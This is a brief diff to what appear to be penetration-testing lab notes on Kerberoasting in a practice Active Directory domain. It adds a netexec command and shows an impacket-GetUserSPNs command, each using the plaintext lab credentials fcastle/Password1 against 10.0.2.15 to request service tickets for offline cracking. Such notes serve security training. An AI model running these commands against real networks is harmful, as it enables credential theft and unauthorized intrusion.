@@ -56,6 +56,10 @@ HYDRA-DC/sqlservice.MARVEL.local:60111  sqlservice  CN=Group Policy Creator Owne
 ```
 
 ## Attack Tools
+### netexec
+```
+nxc ldap 10.0.2.15 -u fcastle -p Password1 --kerberoasting nxc-krbroast-output.log
+```
 ### impacket-GetUserSPNs
 ```
 impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.15 -request
